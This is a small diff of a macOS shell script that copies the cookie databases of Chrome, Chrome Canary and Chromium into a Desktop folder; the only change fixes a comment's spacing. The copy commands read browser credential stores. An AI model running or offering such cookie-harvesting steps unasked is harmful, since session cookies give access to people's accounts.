@@ -12,7 +12,7 @@ mkdir ~/Desktop/Cookies/
 # 1. Grab Chrome Cookies
 cp "$HOME/Library/Application Support/Google/Chrome/Default/Cookies" ~/Desktop/Cookies/ChromeCookies.db
 
-# 2. Grab Chrome CanaryCookies
+# 2. Grab Chrome Canary Cookies
 cp "$HOME/Library/Application Support/Google/Chrome Canary/Default/Cookies" ~/Desktop/Cookies/ChromeCanaryCookies.db
 
 # 3. Grab Chromium Cookies
